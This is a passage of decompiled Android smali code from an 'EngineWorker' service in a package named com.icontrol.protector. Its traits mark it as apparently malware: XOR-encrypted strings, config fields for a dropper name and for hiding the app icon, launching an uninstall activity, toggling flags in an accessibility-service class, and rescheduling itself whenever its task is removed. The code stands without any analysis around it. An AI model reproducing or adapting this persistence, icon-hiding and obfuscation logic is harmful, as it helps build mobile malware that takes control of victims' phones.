    invoke-static {v3, v0, v7}, Lntidisestablish/neumonoul/floccinaucinih/sq;->f(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)V

    const-wide/16 v14, 0x1388

    invoke-static {v14, v15}, Ljava/lang/Thread;->sleep(J)V
    :try_end_e
    .catch Ljava/lang/Exception; {:try_start_e .. :try_end_e} :catch_7

    goto :goto_7

    :catch_6
    move-exception v0

    move v11, v13

    goto/16 :goto_4

    :catch_7
    :cond_f
    :goto_7
    const/16 v0, 0x22

    :try_start_f
    sget-object v7, Lcom/icontrol/protector/My_Configs;->Drop_name:Ljava/lang/String;

    invoke-virtual {v3}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v9

    invoke-static {v7, v9}, Lcom/icontrol/protector/n;->P(Ljava/lang/String;Landroid/content/pm/PackageManager;)Z

    move-result v9

    if-eqz v9, :cond_10

    new-instance v9, Landroid/content/Intent;

    const/16 v11, 0x27

    new-array v11, v11, [B

    fill-array-data v11, :array_19

    const/16 v14, 0x8

    new-array v15, v14, [B

    fill-array-data v15, :array_1a

    invoke-static {v11, v15}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v11

    invoke-direct {v9, v11}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    new-instance v11, Ljava/lang/StringBuilder;

    invoke-direct {v11}, Ljava/lang/StringBuilder;-><init>()V

    const/16 v14, 0x8

    new-array v15, v14, [B

    fill-array-data v15, :array_1b

    new-array v5, v14, [B

    fill-array-data v5, :array_1c

    invoke-static {v15, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v11, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v11, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v11}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v5

    invoke-virtual {v9, v5}, Landroid/content/Intent;->setData(Landroid/net/Uri;)Landroid/content/Intent;

    new-array v5, v0, [B

    fill-array-data v5, :array_1d

    const/16 v7, 0x8

    new-array v11, v7, [B

    fill-array-data v11, :array_1e

    invoke-static {v5, v11}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v9, v5, v13}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Z)Landroid/content/Intent;

    const/high16 v5, 0x10000000

    invoke-virtual {v9, v5}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    sput-boolean v13, Lntidisestablish/neumonoul/floccinaucinih/ab;->i0:Z

    invoke-virtual {v3, v9}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end_f
    .catch Ljava/lang/Exception; {:try_start_f .. :try_end_f} :catch_8

    goto :goto_8

    :catch_8
    const/4 v5, 0x0

    goto :goto_9

    :cond_10
    :goto_8
    const-wide/16 v14, 0x7d0

    :try_start_10
    invoke-static {v14, v15}, Ljava/lang/Thread;->sleep(J)V
    :try_end_10
    .catch Ljava/lang/Exception; {:try_start_10 .. :try_end_10} :catch_9

    goto :goto_a

    :goto_9
    :try_start_11
    sput-boolean v5, Lntidisestablish/neumonoul/floccinaucinih/ab;->i0:Z
    :try_end_11
    .catch Ljava/lang/Exception; {:try_start_11 .. :try_end_11} :catch_15

    :catch_9
    :goto_a
    const/16 v5, 0x2710

    :try_start_12
    sput v5, Lcom/icontrol/protector/EngineWorker;->b:I

    sget-object v5, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    invoke-static {v5}, Lcom/icontrol/protector/a;->i(Ljava/lang/Boolean;)V

    invoke-static {v6}, Lcom/icontrol/protector/a;->s(Ljava/lang/String;)V

    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v7

    sget-object v9, Lntidisestablish/neumonoul/floccinaucinih/ab;->D:Ljava/lang/String;

    invoke-static {v7, v9, v5}, Lntidisestablish/neumonoul/floccinaucinih/sq;->f(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)V
    :try_end_12
    .catch Ljava/lang/Exception; {:try_start_12 .. :try_end_12} :catch_e

    const/4 v5, 0x0

    :try_start_13
    sput-boolean v5, Lcom/icontrol/protector/AccessServices;->y:Z

    sget-object v7, Lcom/icontrol/protector/My_Configs;->Hide_ico:Ljava/lang/String;

    new-array v9, v13, [B

    const/16 v11, 0x3e

    aput-byte v11, v9, v5
    :try_end_13
    .catch Ljava/lang/Exception; {:try_start_13 .. :try_end_13} :catch_15

    const/16 v5, 0x8

    :try_start_14
    new-array v11, v5, [B

    fill-array-data v11, :array_1f
    :try_end_14
    .catch Ljava/lang/Exception; {:try_start_14 .. :try_end_14} :catch_13

    :try_start_15
    invoke-static {v9, v11}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v7, v9}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7
    :try_end_15
    .catch Ljava/lang/Exception; {:try_start_15 .. :try_end_15} :catch_14

    if-eqz v7, :cond_12

    :try_start_16
    new-array v7, v5, [B

    fill-array-data v7, :array_20
    :try_end_16
    .catch Ljava/lang/Exception; {:try_start_16 .. :try_end_16} :catch_13

    :try_start_17
    new-array v9, v5, [B
    :try_end_17
    .catch Ljava/lang/Exception; {:try_start_17 .. :try_end_17} :catch_12

    :try_start_18
    fill-array-data v9, :array_21
    :try_end_18
    .catch Ljava/lang/Exception; {:try_start_18 .. :try_end_18} :catch_11

    :try_start_19
    invoke-static {v7, v9}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    sget-object v7, Ljava/lang/Boolean;->TRUE:Ljava/lang/Boolean;

    invoke-static {v3, v5, v7}, Lntidisestablish/neumonoul/floccinaucinih/sq;->f(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)V

    sget-object v5, Lcom/icontrol/protector/My_Configs;->Hide_Type:Ljava/lang/String;

    new-array v7, v13, [B
    :try_end_19
    .catch Ljava/lang/Exception; {:try_start_19 .. :try_end_19} :catch_e

    const/4 v9, 0x0

    :try_start_1a
    aput-byte v0, v7, v9
    :try_end_1a
    .catch Ljava/lang/Exception; {:try_start_1a .. :try_end_1a} :catch_d

    const/16 v9, 0x8

    :try_start_1b
    new-array v0, v9, [B
    :try_end_1b
    .catch Ljava/lang/Exception; {:try_start_1b .. :try_end_1b} :catch_10

    :try_start_1c
    fill-array-data v0, :array_22
    :try_end_1c
    .catch Ljava/lang/Exception; {:try_start_1c .. :try_end_1c} :catch_f

    :try_start_1d
    invoke-static {v7, v0}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v5, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0
    :try_end_1d
    .catch Ljava/lang/Exception; {:try_start_1d .. :try_end_1d} :catch_e

    if-eqz v0, :cond_11

    :try_start_1e
    new-instance v0, Landroid/content/Intent;

    const-class v5, Lcom/icontrol/protector/UninstallActivity;

    invoke-direct {v0, v3, v5}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/high16 v5, 0x10000000

    invoke-virtual {v0, v5}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v3, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end_1e
    .catch Ljava/lang/Exception; {:try_start_1e .. :try_end_1e} :catch_a

    :goto_b
    const/16 v7, 0x8

    :goto_c
    const/4 v9, 0x0

    goto :goto_10

    :catch_a
    move-exception v0

    :try_start_1f
    invoke-virtual {v0}, Ljava/lang/Throwable;->printStackTrace()V
    :try_end_1f
    .catch Ljava/lang/Exception; {:try_start_1f .. :try_end_1f} :catch_6

    goto :goto_b

    :cond_11
    :try_start_20
    sget-object v0, Lcom/icontrol/protector/My_Configs;->Hide_Type:Ljava/lang/String;

    new-array v5, v13, [B
    :try_end_20
    .catch Ljava/lang/Exception; {:try_start_20 .. :try_end_20} :catch_e

    const/16 v7, 0x48

    const/4 v9, 0x0

    :try_start_21
    aput-byte v7, v5, v9
    :try_end_21
    .catch Ljava/lang/Exception; {:try_start_21 .. :try_end_21} :catch_d

    const/16 v7, 0x8

    :try_start_22
    new-array v11, v7, [B

    fill-array-data v11, :array_23

    invoke-static {v5, v11}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v0, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0
    :try_end_22
    .catch Ljava/lang/Exception; {:try_start_22 .. :try_end_22} :catch_c

    if-eqz v0, :cond_13

    :try_start_23
    sget-object v0, Lcom/icontrol/protector/My_Configs;->HA:Ljava/lang/String;

    invoke-direct {v1, v0, v3}, Lcom/icontrol/protector/EngineWorker;->b(Ljava/lang/String;Landroid/content/Context;)V

    sget-object v0, Lcom/icontrol/protector/My_Configs;->MA:Ljava/lang/String;

    invoke-direct {v1, v0, v3}, Lcom/icontrol/protector/EngineWorker;->a(Ljava/lang/String;Landroid/content/Context;)V
    :try_end_23
    .catch Ljava/lang/Exception; {:try_start_23 .. :try_end_23} :catch_b

    goto :goto_10

    :catch_b
    move-exception v0

    :try_start_24
    invoke-virtual {v0}, Ljava/lang/Throwable;->printStackTrace()V
    :try_end_24
    .catch Ljava/lang/Exception; {:try_start_24 .. :try_end_24} :catch_c

    goto :goto_10

    :catch_c
    move-exception v0

    :goto_d
    move v11, v13

    goto :goto_13

    :catch_d
    move-exception v0

    :goto_e
    const/16 v7, 0x8

    goto :goto_d

    :catch_e
    move-exception v0

    const/16 v7, 0x8

    :goto_f
    const/4 v9, 0x0

    goto :goto_d

    :catch_f
    move-exception v0

    const/16 v7, 0x8

    goto :goto_f

    :catch_10
    move-exception v0

    move v7, v9

    goto :goto_f

    :catch_11
    move-exception v0

    const/16 v7, 0x8

    goto :goto_f

    :catch_12
    move-exception v0

    move v7, v5

    goto :goto_f

    :catch_13
    move-exception v0

    move v7, v5

    goto :goto_f

    :cond_12
    move v7, v5

    goto :goto_c

    :cond_13
    :goto_10
    move v11, v13

    goto :goto_11

    :catch_14
    move-exception v0

    move v7, v5

    goto :goto_f

    :catch_15
    move-exception v0

    move v9, v5

    goto :goto_e

    :cond_14
    const/16 v7, 0x8

    const/4 v9, 0x0

    :goto_11
    :try_start_25
    sget-object v0, Lntidisestablish/neumonoul/floccinaucinih/ab;->Y:Ljava/lang/String;

    sget-object v5, Ljava/lang/Boolean;->TRUE:Ljava/lang/Boolean;

    invoke-static {v3, v0, v5}, Lntidisestablish/neumonoul/floccinaucinih/sq;->f(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)V

    sput-boolean v13, Lcom/icontrol/protector/AccessServices;->u:Z
    :try_end_25
    .catch Ljava/lang/Exception; {:try_start_25 .. :try_end_25} :catch_16

    :goto_12
    move v5, v7

    const/16 v7, 0x1a

    goto/16 :goto_1

    :catch_16
    move-exception v0

    goto :goto_13

    :catch_17
    move-exception v0

    move v7, v5

    :goto_13
    invoke-virtual {v0}, Ljava/lang/Throwable;->printStackTrace()V

    goto :goto_12

    :array_0
    .array-data 1
        0x2t
        -0x58t
    .end array-data

    nop

    :array_1
    .array-data 1
        0x4bt
        -0x14t
        -0x4at
        -0x74t
        -0x6t
        -0x4dt
        0x3ct
        -0x18t
    .end array-data

    :array_2
    .array-data 1
        -0x15t
        -0x73t
        -0x41t
        -0x67t
        -0x3bt
        0x5ct
        -0x5dt
        0x4t
    .end array-data

    :array_3
    .array-data 1
        -0x58t
        -0x1t
        -0x26t
        -0x8t
        -0x4ft
        0x39t
        -0x16t
        0x40t
    .end array-data

    :array_4
    .array-data 1
        -0x68t
        0x1bt
    .end array-data

    nop

    :array_5
    .array-data 1
        -0x2ft
        0x5ft
        -0x49t
        -0x26t
        0x26t
        0x5t
        -0x3ft
        0x55t
    .end array-data

    :array_6
    .array-data 1
        0x57t
        0x43t
        0x6bt
        -0x4dt
        -0x51t
        0x16t
        -0x70t
        0x7bt
    .end array-data

    :array_7
    .array-data 1
        0x6ft
        0x2et
        0x3at
        -0x1dt
        0x1ft
        0x3ft
        0x4t
        0x55t
        0x7dt
        0x25t
        0x2at
        -0x1bt
        0x19t
        0x38t
        0x7t
        0x8t
        0x20t
        0x21t
        0x3dt
        -0x1bt
        0x19t
        0x39t
        0xet
        0x55t
        0x43t
        0x1t
        0x10t
        -0x30t
        0x37t
        0x13t
        0x3ft
        0x2ct
        0x5ct
        0x9t
        0xat
        -0x2ct
        0x2ft
        0x5t
        0x25t
        0x2ft
        0x5at
        0x9t
        0x10t
        -0x2at
        0x23t
    .end array-data

    nop

    :array_8
    .array-data 1
        0xet
        0x40t
        0x5et
        -0x6ft
        0x70t
        0x56t
        0x60t
        0x7bt
    .end array-data

    :array_9
    .array-data 1
        0x44t
        -0x39t
        -0x5at
        -0x13t
        -0x4et
        0xbt
        -0x66t
        0x4dt
    .end array-data

    :array_a
    .array-data 1
        0x34t
        -0x5at
        -0x3bt
        -0x7at
        -0x2dt
        0x6ct
        -0x1t
        0x77t
    .end array-data

    :array_b
    .array-data 1
        -0x53t
        0x3dt
        -0x19t
        -0x34t
        -0xdt
        -0x44t
        -0x6dt
        -0x38t
    .end array-data

    :array_c
    .array-data 1
        -0x23t
        0x5ct
        -0x7ct
        -0x59t
        -0x6et
        -0x25t
        -0xat
        -0xet
    .end array-data

    :array_d
    .array-data 1
        -0x59t
        -0x12t
        0x5bt
        0x75t
        0x54t
        0x31t
        -0x6t
        -0x5bt
        -0x4bt
        -0x1bt
        0x4bt
        0x73t
        0x52t
        0x36t
        -0x7t
        -0x8t
        -0x18t
        -0x2bt
        0x6ct
        0x46t
        0x7ct
        0x1dt
        -0x3ft
        -0x36t
        -0x7bt
        -0x3dt
        0x7at
        0x54t
        0x68t
        0x7t
        -0x33t
        -0x32t
        -0x6et
        -0x2ct
        0x76t
        0x49t
        0x7ct
        0xbt
    .end array-data

    nop

    :array_e
    .array-data 1
        -0x3at
        -0x80t
        0x3ft
        0x7t
        0x3bt
        0x58t
        -0x62t
        -0x75t
    .end array-data

    :array_f
    .array-data 1
        -0x25t
        0x23t
        0xet
        -0xft
        -0x51t
        -0x4dt
        0xct
        -0x4t
    .end array-data

    :array_10
    .array-data 1
        -0x55t
        0x42t
        0x6dt
        -0x66t
        -0x32t
        -0x2ct
        0x69t
        -0x3at
    .end array-data

    :array_11
    .array-data 1
        -0x42t
        0x52t
        -0x4dt
        -0x28t
        -0x7dt
        0x46t
        -0x17t
        -0x5ct
        -0x54t
        0x59t
        -0x5dt
        -0x22t
        -0x7bt
        0x41t
        -0x16t
        -0x7t
        -0xft
        0x71t
        -0x6at
        -0x1ct
        -0x53t
        0x68t
        -0x38t
        -0x2bt
        -0x62t
        0x6ct
        -0x79t
        -0xbt
        -0x53t
        0x63t
        -0x3ft
        -0x2bt
        -0x67t
        0x75t
        -0x65t
        -0x11t
        -0x41t
        0x70t
        -0x34t
        -0x37t
        -0x64t
        0x79t
        -0x7ct
        -0x7t
        -0x4dt
        0x7ft
        -0x38t
        -0x28t
        -0x6et
        0x75t
        -0x7ct
        -0x7t
        -0x5bt
        0x60t
        -0x3dt
    .end array-data

    :array_12
    .array-data 1
        -0x21t
        0x3ct
        -0x29t
        -0x56t
        -0x14t
        0x2ft
        -0x73t
        -0x76t
    .end array-data

    :array_13
    .array-data 1
        0x26t
        0x53t
        0x54t
        -0x7ct
        0x12t
        0x13t
        0x78t
    .end array-data

    :array_14
    .array-data 1
        0x56t
        0x32t
        0x37t
        -0x11t
        0x73t
        0x74t
        0x1dt
        0x72t
    .end array-data

    :array_15
    .array-data 1
        -0x71t
        -0x33t
        -0x19t
        -0x6at
        -0x60t
        -0x24t
        -0x42t
        -0x31t
        -0x63t
        -0x3at
        -0x9t
        -0x70t
        -0x5at
        -0x25t
        -0x43t
        -0x6et
        -0x40t
        -0xft
        -0x3at
        -0x4bt
        -0x66t
        -0x10t
        -0x77t
        -0x4bt
        -0x4ft
        -0x16t
        -0x3ct
        -0x56t
        -0x80t
        -0x19t
        -0x61t
        -0x42t
        -0x54t
        -0x1et
        -0x29t
        -0x50t
        -0x76t
        -0x19t
        -0x7dt
        -0x42t
        -0x5ft
        -0xdt
        -0x29t
        -0x53t
        -0x7et
        -0x4t
        -0x80t
        -0x60t
        -0x46t
        -0x16t
        -0x34t
        -0x56t
        -0x64t
    .end array-data

    nop

    :array_16
    .array-data 1
        -0x12t
        -0x5dt
        -0x7dt
        -0x1ct
        -0x31t
        -0x4bt
        -0x26t
        -0x1ft
    .end array-data

    :array_17
    .array-data 1
        -0x8t
        -0x25t
        0x4bt
        -0x6ct
        -0x5bt
        -0x11t
        -0x3bt
        -0x3ft
    .end array-data

    :array_18
    .array-data 1
        -0x78t
        -0x46t
        0x28t
        -0x1t
        -0x3ct
        -0x78t
        -0x60t
        -0x5t
    .end array-data

    :array_19
    .array-data 1
        -0x3at
        -0x4at
        -0x19t
        0x11t
        0x13t
        -0x79t
        0x3ft
        -0x7ft
        -0x32t
        -0x4at
        -0x9t
        0x6t
        0x12t
        -0x66t
        0x75t
        -0x32t
        -0x3ct
        -0x54t
        -0x16t
        0xct
        0x12t
        -0x40t
        0xet
        -0x1ft
        -0x12t
        -0x6at
        -0x30t
        0x37t
        0x3dt
        -0x5et
        0x17t
        -0x10t
        -0x9t
        -0x67t
        -0x40t
        0x28t
        0x3dt
        -0x57t
        0x1et
    .end array-data

    :array_1a
    .array-data 1
        -0x59t
        -0x28t
        -0x7dt
        0x63t
        0x7ct
        -0x12t
        0x5bt
        -0x51t
    .end array-data

    :array_1b
    .array-data 1
        -0x9t
        -0x69t
        0x27t
        -0x7dt
        -0x72t
        0x71t
        -0x67t
        0xdt
    .end array-data

    :array_1c
    .array-data 1
        -0x79t
        -0xat
        0x44t
        -0x18t
        -0x11t
        0x16t
        -0x4t
        0x37t
    .end array-data

    :array_1d
    .array-data 1
        0x5bt
        -0x13t
        -0x22t
        -0x46t
        -0x71t
        0x29t
        -0x7bt
        0x35t
        0x53t
        -0x13t
        -0x32t
        -0x53t
        -0x72t
        0x34t
        -0x31t
        0x7et
        0x42t
        -0x9t
        -0x38t
        -0x57t
        -0x32t
        0x12t
        -0x5ct
        0x4ft
        0x6ft
        -0x2ft
        -0xct
        -0x69t
        -0x4et
        0x5t
        -0x4et
        0x4et
        0x76t
        -0x29t
    .end array-data

    nop

    :array_1e
    .array-data 1
        0x3at
        -0x7dt
        -0x46t
        -0x38t
        -0x20t
        0x40t
        -0x1ft
        0x1bt
    .end array-data

    :array_1f
    .array-data 1
        0xft
        0x65t
        0x77t
        -0x4bt
        0x19t
        0x6dt
        -0x72t
        0x6et
    .end array-data

    :array_20
    .array-data 1
        0x29t
        -0x68t
        -0x3dt
        -0x36t
        -0x43t
        0x5at
        0x4bt
        -0x3bt
    .end array-data

    :array_21
    .array-data 1
        0x5at
        -0x3t
        -0x49t
        -0x41t
        -0x33t
        0x5t
        0x24t
        -0x52t
    .end array-data

    :array_22
    .array-data 1
        0x44t
        0x4ft
        -0x6t
        0x1dt
        -0x3et
        0x33t
        -0x1ft
        -0x76t
    .end array-data

    :array_23
    .array-data 1
        0x2bt
        0x1bt
        -0x2t
        -0x64t
        -0x7dt
        -0x33t
        0x3t
        -0x2et
    .end array-data
.end method

.method public onStart(Landroid/content/Intent;I)V
    .locals 0

    invoke-super {p0, p1, p2}, Landroid/app/IntentService;->onStart(Landroid/content/Intent;I)V

    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object p1

    invoke-direct {p0, p1}, Lcom/icontrol/protector/EngineWorker;->c(Landroid/content/Context;)V

    return-void
.end method

.method public onTaskRemoved(Landroid/content/Intent;)V
    .locals 5

    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v1

    const-wide/16 v3, 0x3a98

    add-long/2addr v1, v3

    const-class v3, Lcom/icontrol/protector/EngineWorker;

    invoke-static {v0, v3, v1, v2}, Lntidisestablish/neumonoul/floccinaucinih/y1;->b(Landroid/content/Context;Ljava/lang/Class;J)V

    new-instance v1, Landroid/content/Intent;

    invoke-direct {v1, v0, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    sget v2, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v3, 0x1a

    if-lt v2, v3, :cond_0

    invoke-static {v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/p1;->a(Landroid/content/Context;Landroid/content/Intent;)Landroid/content/ComponentName;

    goto :goto_0

    :cond_0
    invoke-virtual {v0, v1}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    :goto_0
    invoke-super {p0, p1}, Landroid/app/Service;->onTaskRemoved(Landroid/content/Intent;)V

    return-void
.end method
